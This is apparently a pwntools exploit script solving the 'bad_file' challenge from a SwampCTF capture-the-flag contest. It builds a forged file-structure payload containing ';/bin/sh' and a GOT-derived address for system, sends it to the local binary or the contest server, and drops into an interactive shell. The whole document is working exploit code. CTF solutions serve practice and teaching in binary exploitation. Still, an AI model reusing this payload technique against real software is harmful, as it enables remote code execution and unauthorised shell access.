from pwn import *
import sys

if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./bad_file")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	elf = ELF("./bad_file")
else:
	p = remote("chal1.swampctf.com","2050")
	elf = ELF("./bad_file")

def add(name,temp = True):
	if temp:
		p.sendlineafter("permanent name?","1")
	else:
		p.sendlineafter("permanent name?","2")
	p.sendline(name)

def debugf():
	gdb.attach(p,"b *0x400916")

context.log_level = "debug"
context.terminal = ["tmux","splitw","-h"]
#debugf()
target = elf.got["system"]
add("aaa")
payload = "a"*0xd8 + p64(0x4008a7)
payload = p16(0x8008) + ";/bin/sh" + p16(0) + p64(0x602500)*6 + p64(0x602600) + p64(0x602601)
payload = payload.ljust(0xd8,"\x00")
payload += p64(target - 0x40)
p.sendafter("need a new name.",payload)
p.interactive()
